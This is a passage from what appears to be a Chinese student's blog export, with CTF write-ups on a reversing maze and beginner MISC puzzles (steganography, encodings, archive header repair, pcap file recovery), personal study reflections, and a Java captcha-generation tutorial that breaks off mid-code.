<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//'O'--&gt;左</span><br>sub_400650:<br><span class="hljs-function"><span class="hljs-keyword">bool</span> __fastcall <span class="hljs-title">sub_400650</span><span class="hljs-params">(_DWORD *a1)</span><br></span>&#123;<br>  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// eax</span><br><br>  v1 = (*a1)--;<br>  <span class="hljs-keyword">return</span> v1 &gt; <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//'o'--&gt;右</span><br>sub_400660:<br><span class="hljs-function"><span class="hljs-keyword">bool</span> __fastcall <span class="hljs-title">sub_400660</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a1)</span><br></span>&#123;<br>  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// eax</span><br><br>  v1 = *a1 + <span class="hljs-number">1</span>;<br>  *a1 = v1;<br>  <span class="hljs-keyword">return</span> v1 &lt; <span class="hljs-number">8</span>;<br>&#125;<br><br><br><span class="hljs-comment">//'.'--&gt;上</span><br>sub_400670：<br><span class="hljs-function"><span class="hljs-keyword">bool</span> __fastcall <span class="hljs-title">sub_400670</span><span class="hljs-params">(_DWORD *a1)</span><br></span>&#123;<br>  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// eax</span><br><br>  v1 = (*a1)--;<br>  <span class="hljs-keyword">return</span> v1 &gt; <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//'0'--&gt;下</span><br>sub_400680：<br><span class="hljs-function"><span class="hljs-keyword">bool</span> __fastcall <span class="hljs-title">sub_400680</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a1)</span><br></span>&#123;<br>  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// eax</span><br><br>  v1 = *a1 + <span class="hljs-number">1</span>;<br>  *a1 = v1;<br>  <span class="hljs-keyword">return</span> v1 &lt; <span class="hljs-number">8</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>这里说说为什么我花了很长时间都没有看懂这题。。。</p>
<p><strong>开始是真的没看懂为什么传参sub_400650函数是传入v9+1是向左，sub_400660函数传入v9+1是向右；<br>而sub_400670传入v9是向上，sub_400680传入v9是向下。<br>看了wp，也没说清楚，看了很久，突然发现，二维数组的话，<em>p+1表示的是在二维上操作，而</em>p表示的在一维上操作，v9+1其实就是表示在行上操作，而v9就是表示在列上操作。</strong></p>
<p>其他的不是很难，还有一个知识点。</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( !(<span class="hljs-keyword">unsigned</span> __int8)sub_400690(asc_601060, HIDWORD(v9), (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v9) )<br>        <span class="hljs-keyword">goto</span> LABEL_22;<br></code></pre></div></td></tr></table></figure>

<p>先看一下这行代码中，这个函数sub_400690</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">sub_400690</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">int</span> a2, <span class="hljs-keyword">int</span> a3)</span><br></span>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br><br>  result = *(<span class="hljs-keyword">unsigned</span> __int8 *)(a1 + a2 + <span class="hljs-number">8L</span>L * a3);<br>  LOBYTE(result) = (_DWORD)result == <span class="hljs-number">32</span> || (_DWORD)result == <span class="hljs-number">35</span>;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>(a1是迷宫地址，a2是v10下一单位，SHIDWORD就是这个意思，a3就是v10。这里说的就是SHIDWOED这个小知识点)<br>我们看一下asc_601060这个值，发现是这么一个东西，就是我们开始搜索字符串的东西</p>
<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">'  *******   *  **** * ****  * ***  *#  *** *** ***     *********'<br></code></pre></div></td></tr></table></figure>

<p>再根据题目提示的迷宫，有可能会想到这是地图，不过还是比较抽象的，如果你想到了，再根据，判断上下左右的函数，中 return v1和0，8比较，可以看出是一个8x8的地图。从[0,0]开始走到”#”这个位置。</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">  ******<br>*   *  *<br>*** * **<br>**  * **<br>*  *#  *<br>** *** *<br>**     *<br>********<br></code></pre></div></td></tr></table></figure>

<p>再根据，’O’–&gt;左,’o’–&gt;右,’.’–&gt;上,’0’–&gt;下，写出flag。有人可能会说说不只一种走法，所以不只一种flag，但是，前面我们提到过，<code>strlen(&amp;s1) != 24</code>，不等于24，直接输出 <code>Wrong flag!</code></p>
<p>========================================</p>
<p>总结一下：<br>    1、多读代码，多看代码，多写代码，才能更好、更快理解代码。<br>    2、脑洞放大一下，这需要通过长期练习，说多了，就是多练多写。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界 MISC基础题</title>
    <url>/article/609fdf0c.html</url>
    <content><![CDATA[<p>因为要参加比赛，我们小组制定了计划，这周是misc的基础题，这里写下wp</p>
<h3 id="this-is-flag"><a href="#this-is-flag" class="headerlink" title="this_is_flag"></a>this_is_flag</h3><p>第一题不说了，题目描述中给出了答案</p>
<a id="more"></a>
<h3 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h3><p>这一题我知道要移开图片才能看到里面的flag，但wps打开，编辑图片还要会员，摸索了一阵，我发现在点击滑动图片的时候，有一块阴影的地方<br><img src="https://qiniuyun.fxhstudy.com/pdf.png" srcset="/img/loading.gif"  alt="1" /><br>话不多说，直接CTRL+C，拿到flag</p>
<h3 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h3><p>这一题不多说，这么多黑白黑白照片，基本上能才得到是密码，但是是什么密码呢？没错，就是二进制，白代表0，黑色代表1<br>我是靠手写的，最近在学py，所以努力下次能自己写出脚本</p>
<h3 id="如来十三掌"><a href="#如来十三掌" class="headerlink" title="如来十三掌"></a>如来十三掌</h3><p>文件下载完了之后是一串佛文，直接搜与佛论禅，这是一种加密了的信息，<br>记住解密的时候，文字之前加“佛曰：”，<br><img src="https://qiniuyun.fxhstudy.com/%E5%A6%82%E6%9D%A5%E5%8D%81%E4%B8%89%E6%8E%8C1.png" srcset="/img/loading.gif"  alt="1" /></p>
<p>解密之后是这样的，开始还比较开心，以为是base64，但解出来是一段乱码，看了前人的wp之后才发现<br>是<a href="https://baike.baidu.com/item/ROT13/7086083?fr=aladdin" target="_blank" rel="noopener"> ROT13</a>，这个加密方式我之前转载的文章中有介绍，这里不多介绍了</p>
<img src="https://qiniuyun.fxhstudy.com/%E5%A6%82%E6%9D%A5%E5%8D%81%E4%B8%89%E6%8E%8C2.png" srcset="/img/loading.gif"  alt="1" />

<p>解码得到base64编码，继续解码，得到flag</p>
<img src="https://qiniuyun.fxhstudy.com/%E5%A6%82%E6%9D%A5%E5%8D%81%E4%B8%89%E6%8E%8C3.png" srcset="/img/loading.gif"  alt="1" />

<h3 id="give-you-flag"><a href="#give-you-flag" class="headerlink" title="give_you_flag"></a>give_you_flag</h3><p>这题是个gif动态图，可以发现，其中有一张图包含了二维码，但是一扫而过，我用到了Stegsolve这个工具<br>用工具打开动态图–&gt;Analyse–&gt;Frame Browser,一张一张的看，第五十张看到含有flag的图片<br>，但是发现和平常的QR code不一样，</p>
<img src="https://qiniuyun.fxhstudy.com/give_you_flag.bmp" srcset="/img/loading.gif"  alt="1" />

<p>缺少定位符，然后各凭本事弄上去，扫一下，得到flag</p>
<h3 id="SimpleRAR"><a href="#SimpleRAR" class="headerlink" title="SimpleRAR"></a>SimpleRAR</h3><p>这一题可复杂了啊，先了解一下rar每个块的开头吧<br></br><br><img src="https://qiniuyun.fxhstudy.com/simpleRAR1.png?attname=" srcset="/img/loading.gif"  alt="1" /><br></br><br><img src="https://qiniuyun.fxhstudy.com/simpleRAR2.png?attname=" srcset="/img/loading.gif"  alt="1" /><br></br><br>在来看题目，发现附件解压出来的是flag.txt,但是没有flag值，用winhex打开附件，<br></br><br><img src="https://qiniuyun.fxhstudy.com/simpleRAR3.png?attname=" srcset="/img/loading.gif"  alt="1" /><br></br><br>发现还有存在secret.png,就要运用上面给到的知识点了，我们要的是文件头部，而不是子块<br>讲圈起来的7A改为74，然后解压。<br>解压之后发现是一张空白的照片，用WinHex打开，发现其实它是一个gif，然后我就想到用StegSolve打开gif，<br>发现两个照片，保存下来。再用StegSolve分别打开两张图片，多次尝试之后发现<br></br><br><img src="https://qiniuyun.fxhstudy.com/simpleRAR4.png?attname=" srcset="/img/loading.gif"  alt="1" /><br></br><br>这就好办了，然后凭自己的本事，拼接定位符，扫码，得到flag值<br>其实从这题我们就可以看出，CTF就需要不断地尝试一切可能，这个方法不行，就换一种方法，执着于一种方法可能不太行</p>
<h3 id="坚持60s"><a href="#坚持60s" class="headerlink" title="坚持60s"></a>坚持60s</h3><p>这个是一个小游戏，要求坚持60s，60s？60s是不可能的，这辈子都不可能超过10s的。<br>这题主要考察对jar文件的反编译能力，虽然没学过java，但一直到反编译是个什么东西，去看一下这个 <a href="https://www.cnblogs.com/the-tops/p/6207191.html" target="_blank" rel="noopener">将JAR包反编译，修改后重新打包</a></p>
<img src="https://qiniuyun.fxhstudy.com/%E5%9D%9A%E6%8C%8160s.png?attname=" srcset="/img/loading.gif"  alt="1" />

<p>flag里面的还需要解码一下（base64）</p>
<h3 id="掀桌子"><a href="#掀桌子" class="headerlink" title="掀桌子"></a>掀桌子</h3><p>这个我开始是以为base16，发现失败了，两位十六进制可表示一个字节，但两两一组转化为十进制都超过了128，众所周知，ASCII是0-127，<br>减去128(看wp的)，再转化成ASCII码，直接写脚本，这个还是比较好写的</p>
<blockquote><li>cc = '\xc8\xe9\xac\xa0\xc6\xf2\xe5\xf3\xe8\xc4\xef\xe7\xa1\xa0\xd4\xe8\xe5\xa0\xe6\xec\xe1\xe7\xa0\xe9\xf3\xba\xa0\xe8\xea\xfa\xe3\xf9\xe4\xea\xfa\xe2\xea\xe4\xe3\xea\xeb\xfa\xeb\xe3\xf5\xe7\xe9\xf3\xe4\xe3\xe8\xea\xf9\xea\xf3\xe2\xe4\xe6\xf2'</li>
    <li>cd = ''</li>
    <li>for i in cc:</br>
        &nbsp &nbsp &nbsp &nbsp &nbsp cd += chr(ord(i) - 128)</li>
    <li>print(cd)</li>
</blockquote>

<h3 id="base64stego"><a href="#base64stego" class="headerlink" title="base64stego"></a>base64stego</h3><p>做题之前先了解一下什么是zip伪加密<a href="https://blog.csdn.net/ETF6996/article/details/51946250" target="_blank" rel="noopener">zip伪加密</a><br>伪加密还是很好解决的，开始以为只考了这一个知识点，刚刚准备窃喜，打开解压出的TXT文件一看，当场暴毙，这多少个base64加密信息啊<br>想一个一个试，失败了。实在没辙了，看了大佬的wp之后，最后觉得这位大佬介绍的最详细，以我现在python的水平，还写不出来这种脚本。<br>难受，放上大佬文章<a href="https://www.tr0y.wang/2017/06/14/Base64steg/" target="_blank" rel="noopener">神奇的 Base64 隐写 </a></p>
<h3 id="ext3"><a href="#ext3" class="headerlink" title="ext3"></a>ext3</h3><p>题目提示ext3，EXT3是第三代扩展文件系统（英语：Third extended filesystem，缩写为ext3），是一个日志文件系统，常用于Linux操作系统。<br>先用WinHex打开，找到了flag.txt的路径，</p>
<img src="https://qiniuyun.fxhstudy.com/ext3-1.png?attname=" srcset="/img/loading.gif"  alt="1" />

<p>接着挂载到linux上，看图</p>
<img src="https://qiniuyun.fxhstudy.com/ext3-2.png?attname=" srcset="/img/loading.gif"  alt="1" />

<p>最后再解码，得到flag</p>
<h3 id="stegano"><a href="#stegano" class="headerlink" title="stegano"></a>stegano</h3><p>打开附件，摸索了一阵，发现了这个，</p>
<img src="https://qiniuyun.fxhstudy.com/stegano1.png" srcset="/img/loading.gif"  alt="1" />

<p>ctrl+c，接着在最下面发现了这么一串文字</p>
<img src="https://qiniuyun.fxhstudy.com/stegano2.png" srcset="/img/loading.gif"  alt="1" />

<p>开始以为是培根密码，但其中还有BBB BA…这种，然后就意识到不是培根密码了，灵光一闪，摩斯密码<br>唉，看来要好好学写脚本了，手工太耗时间了</p>
<img src="https://qiniuyun.fxhstudy.com/stegano3.png" srcset="/img/loading.gif"  alt="1" />

<h3 id="功夫再高也怕菜刀"><a href="#功夫再高也怕菜刀" class="headerlink" title="功夫再高也怕菜刀"></a>功夫再高也怕菜刀</h3><p>这题是看wp的，唉，菜啊，小方！</p>
<p>先foremost分离文件，得到加密的一个zip，没办法，既然是.pcapng文件，那就用wireshark打开分析，<br>查找有没有有关flag关键字</p>
<img src="https://qiniuyun.fxhstudy.com/%E5%8A%9F%E5%A4%AB%E5%86%8D%E9%AB%98%E4%B9%9F%E6%80%95%E8%8F%9C%E5%88%80.png" srcset="/img/loading.gif"  alt="1" />

<p>找到了，flag关键字，还发现存在6666.jpg，于是通过追踪TCP流，我们重新复原图片，从FFD8复制到FFD9，</p>
<img src="https://qiniuyun.fxhstudy.com/%E5%8A%9F%E5%A4%AB%E5%86%8D%E9%AB%98%E4%B9%9F%E6%80%95%E8%8F%9C%E5%88%801.png" srcset="/img/loading.gif"  alt="1" />
<img src="https://qiniuyun.fxhstudy.com/%E5%8A%9F%E5%A4%AB%E5%86%8D%E9%AB%98%E4%B9%9F%E6%80%95%E8%8F%9C%E5%88%802.png" srcset="/img/loading.gif"  alt="1" />

<p>到WinHex里面粘贴一下，注意粘贴格式是ASCII Hex,<br>保存为.jpg格式，打开得到一张图片，以为就是flag值，但是提交了几次发现错了，这时又想到了开始分离出来的加密的.zip文件，把密码输入解压，<br>成功得到flag.txt。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>最近的一些思考和疑惑</title>
    <url>/article/85765e1f.html</url>
    <content><![CDATA[<p>我是一个会反思的人，还是一个会胡思乱想的人。</p>
<p>最近总在想，人生到底是要及时行乐呢，还是应该未雨绸缪，把我们的眼光放长远呢？</p>
<p>因为全国疫情的原因，我发现生命真的很脆弱，可能不经意间，我们就会失去最重要的人</p>
<p>看看自己的父母和外婆，慢慢地我发现我们在一起的时间越来越少了，尽管我很想去多花时间和他们聊聊家常，但我每天都有各种事情要做，</p>
<p>准备下半年的竞赛，国二，英语四级，努力跟上老师的课程以及学习一切我努力要学的。</p>
<p>我每天基本上一睁眼就是对着电脑，接触的越深，你才会发现自己懂得越少。</p>
<p>我知道很多从事IT行业的都是这样的，他们都很累，但我很热爱这一行，我愿意付出，所以每天这么辛苦并觉得累，</p>
<p>只是，我觉得我可以把节奏放慢一点，多花点时间去陪陪家人，可能等到毕业、工作了以后，和他们相处的时间就真的不多了。</p>
<h3>“我不擅长向别人道歉

<p>但有时候我知道应该向别人道歉” —《去他妈的世界》</h3></p>
<img src="https://qiniuyun.fxhstudy.com/1.jpg" srcset="/img/loading.gif" alt="" />]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>个人</tag>
      </tags>
  </entry>
  <entry>
    <title>最近的事</title>
    <url>/article/1695c184.html</url>
    <content><![CDATA[<p><font color="#856363" size="4" face="Open Sans"><b>终于把该记录的文章都写完了，来说一说最近的事情吧。<br>最近参加了计算机设计大赛，可以说是忙了整整一个多月，跟着老师做项目，直到今天校赛才比完(不出意外的话，校赛一等奖了，小窃喜)。</p>
<p>u1s1,灰常灰常累，但是不得不说，成长得很快(被迫成长，没有足够的知识去支持你做项目，但是老师给了你任务，你就必须逼迫着你去学习新知)，虽然是被迫成长，但是确实很大进步，如果按我之前的学习进度来，学到我现在的程度，大概要学到暑假还不一定能够学完。</p>
<p>总得来说，很幸苦，但是真的真的学到了很多东西，不管是技术方面还是与队友如何交流合作方面，都学到了很多。这真的是我没想到的。</p>
<p>也正是因为这个项目，博客也停滞了比较久，之后可能更得比较少，由于学校的名额原因，我们直接进入到了省赛，接下来可以说更忙了，不下于这个月。如果省赛取得了二等奖以及二等奖以上的成绩，那就还要参加国赛，到时候就不是和省里面的大学比赛了，可以接触到更高的层次了，想想就激动。</p>
<p>多说无益，接下来的省赛要好好努力了,争取拿个好一点名次，加油!</p>
</b>
</font>


]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>个人</tag>
      </tags>
  </entry>
  <entry>
    <title>最近的所遇到的一些问题</title>
    <url>/article/f61352f6.html</url>
    <content><![CDATA[<p>学习不可能一直保持着热情，即便是你很喜欢一件事情，但是不停地去做，终究是会感觉到疲惫的。<br>最近的我，感觉有些浮躁，不知道该去做什么，以往的计划也因为一些琐事而被打乱，我的生活很糟糕。<br>没有计划，没有方向，不知道该学什么，总觉得学了这个，那个又放下了，学了那个，这个又不知道该怎么办。<br>我的思维很乱，总是想一些乱七八糟的东西，以前没有的一些想法也慢慢在我的脑子里滋生，不论什么时候，总有一件两件事情，总是在我脑子里转，转啊转，转啊转，之前在宿舍还能够写一篇长篇阅读、两篇仔细阅读，现在一小时可能只能写一篇仔细阅读，我不知道我怎么了。<br>可能是琐事太多，设计大赛的老师在催了，四级又没过，还有接下来的期末考试，CTF的逆向题没时间去刷…我不知道我这些天在忙什么，博客上次更新还是10月31号，今天是11月23号，大半个月了，回看这大半个月，我学到的东西很多吗？真的那么不可开交吗？花在手机上的时间是不是又变多了呢？总是觉得自己很忙碌，总给自己找借口“没有时间去做其他的事是因为我有自己的方向，我要往这个方向钻研”，“我要参加竞赛，总有要学得很多，所以我很忙”。什么狗屁，翻看一下手机记录就会发现，今天用在手机上的时间有七个半小时，想想都有点可怕，从之前的四个多小时，到现在的七个半小时，从月初的那个星期用了31小时，到上个星期的43个小时，我觉的我是时候应该反思一下自己了。是不是真的想学习，是不是真的希望能够得到一些成就，如果还这样的话，能不能成为自己想象的那种人？<br>我并不是真的忙，也不是真的很认真，我这段时间，真的出了问题。<br>人与人之间是有差别的，别人每天都在进步而且比你快很多的在学习，而我却一直在原地踏步。可能在学校，我很努力，但是我所在的学校只是一个小小的二本，二本的上面还有一本，重本，985，211，你不但要和同届生竞争，还要和那些经验比你多很多的毕业了好几年的学长学姐竞争，社会是残酷的，没有人会在意你是不是刚毕业，他们只看你是什么学校毕业，只看你是本科还是专科，是985还是211，没有真本事，很难生存下去。</p>
<p>希望接下来的一段日子，能够静下心来，沉下来，一步一个脚印，去学一些真正有用的东西。把一些没有用的东西抛在脑后，把状态调整好，希望我能够做到。</p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>个人</tag>
      </tags>
  </entry>
  <entry>
    <title>登陆页面验证码的简单实现</title>
    <url>/article/12352dde.html</url>
    <content><![CDATA[<p>这里介绍一下，我们平常在登陆时，所需要的检验的简单的验证码是怎么实现的，这里只介绍大概的步骤，了解原理即可。(为什么写这个呢，因为比较晚了，今天又有一些原因，不太学的进了，又不想这么早就滑手机，就简单记录一下，娱乐时间-1h)</p>
<p>至于美化的话，在开发时一般时是借助别人的代码。。。</p>
<p>这里先贴上大概实现的样图，可能很简陋(不好看?)，美化什么的，我就没有弄了。</p>
<img src="https://qiniuyun.fxhstudy.com/%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B00.png" srcset="/img/loading.gif">
<br/>
<br/>

<p>先介绍涉及到的类</p>
<h2 id="提前须知"><a href="#提前须知" class="headerlink" title="提前须知"></a>提前须知</h2><h3 id="Bfferedimage类"><a href="#Bfferedimage类" class="headerlink" title="Bfferedimage类"></a>Bfferedimage类</h3><p>Image是一个抽象类，BufferedImage是其实现类，是一个带缓冲区图像类，主要作用是将一幅图片加载到内存中（BufferedImage生成的图片在内存里有一个图像缓冲区，利用这个缓冲区我们可以很方便地操作这个图片），提供获得绘图对象、图像缩放、选择图像平滑度等功能，通常用来做图片大小变换、图片变灰、设置透明不透明等。</p>
<h3 id="ImageIO"><a href="#ImageIO" class="headerlink" title="ImageIO"></a>ImageIO</h3><p>提供read()和write()静态方法，读写图片，比以往的InputStream读写更方便。</p>
<h3 id="Graphics类"><a href="#Graphics类" class="headerlink" title="Graphics类"></a>Graphics类</h3><p>提供基本绘图和显示格式化文字的方法，画图用的坐标系原点在左上角，纵轴向下。主要有画线段、矩形、圆、椭圆、圆弧、多边形等各种颜色的图形、线条。</p>
<h2 id="大体分析"><a href="#大体分析" class="headerlink" title="大体分析"></a>大体分析</h2><h3 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h3><p>先创建BufferedImage对象，在内存中的图片。创建大概就如下图所示</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//1.创建对象</span><br><span class="hljs-comment">//1.1设置宽高</span><br><span class="hljs-keyword">int</span> width = <span class="hljs-number">100</span>;<br><span class="hljs-keyword">int</span> height = <span class="hljs-number">50</span>;<br><span class="hljs-comment">//1.2创建对象</span><br>BufferedImage image = <span class="hljs-keyword">new</span> BufferedImage(width, height, BufferedImage.TYPE_3BYTE_BGR);<br></code></pre></div></td></tr></table></figure>

<br>
<img src="https://qiniuyun.fxhstudy.com/%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B01.png" srcset="/img/loading.gif">
<br>
<br>

<h3 id="美化图片"><a href="#美化图片" class="headerlink" title="美化图片"></a>美化图片</h3><p>接着就是美化图片，大概就是改变背景色加边框，再加上画干扰线</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//2. 美化图片</span><br><span class="hljs-comment">//2.1 填充背景色</span><br>Graphics g = image.getGraphics();<span class="hljs-comment">// 画笔对象</span><br>g.setColor(Color.PINK);<span class="hljs-comment">// 设置背景颜色</span><br>g.fill3DRect(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,width, height, <span class="hljs-keyword">true</span>);<br><br><span class="hljs-comment">//2.2 画边框</span><br>g.setColor(Color.blue);<span class="hljs-comment">// 设置边框颜色</span><br>g.draw3DRect(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width-<span class="hljs-number">2</span>, height-<span class="hljs-number">2</span>, <span class="hljs-keyword">true</span>);<br><br><span class="hljs-comment">//2.3 画干扰线</span><br>g.setColor(Color.GREEN);<span class="hljs-comment">// 设置干扰线颜色</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">7</span>; i++) &#123;<br>    <span class="hljs-comment">//随机生成坐标点</span><br>    <span class="hljs-comment">//x1、y1即线的起始坐标，x2、y2即线的终点坐标</span><br>    <span class="hljs-keyword">int</span> x1 = ran.nextInt(width);<br>    <span class="hljs-keyword">int</span> y1 = ran.nextInt(height);<br>    <span class="hljs-keyword">int</span> x2 = ran.nextInt(width);<br>    <span class="hljs-keyword">int</span> y2 = ran.nextInt(height);<br>    g.drawLine(x1, y1, x2, y2);<span class="hljs-comment">//"画进内存"</span><br>&#125;<br></code></pre></div></td></tr></table></figure>

<br>
<img src="https://qiniuyun.fxhstudy.com/%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B02.png" srcset="/img/loading.gif">
<br>

<h3 id="验证码实现"><a href="#验证码实现" class="headerlink" title="验证码实现"></a>验证码实现</h3><p>验证码的实现，原理就是字符串中随机取出四个值，打印到图片上</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String str = <span class="hljs-string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>;<span class="hljs-comment">// 验证码就在这其中取</span><br><span class="hljs-comment">//生成随即图标</span><br>Random ran = <span class="hljs-keyword">new</span> Random();<br><br><span class="hljs-comment">//写验证码</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">4</span>; i++) &#123;<br>    <span class="hljs-keyword">int</span> index = ran.nextInt(str.length());<span class="hljs-comment">//随机生成index下标</span><br>    <span class="hljs-keyword">char</span> ch = str.charAt(index);<span class="hljs-comment">//取值</span><br>    g.drawString(ch+<span class="hljs-string">""</span>, width/<span class="hljs-number">10</span>*(i*<span class="hljs-number">2</span>), height/<span class="hljs-number">2</span>);<span class="hljs-comment">//打印</span><br>&#125;<br></code></pre></div></td></tr></table></figure>

<br>
<img src="https://qiniuyun.fxhstudy.com/%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B03.png" srcset="/img/loading.gif">
<br>

<h3 id="图片输出"><a href="#图片输出" class="headerlink" title="图片输出"></a>图片输出</h3><p>将图片输出到页面</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">ImageIO.write(image, <span class="hljs-string">"jpg"</span>, response.getOutputStream());<br></code></pre></div></td></tr></table></figure>

<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span> width = <span class="hljs-number">100</span>;<br><span class="hljs-keyword">int</span> height = <span class="hljs-number">50</span>;<br><br><span class="hljs-comment">//创建对象</span><br>BufferedImage image = <span class="hljs-keyword">new</span> BufferedImage(width, height, 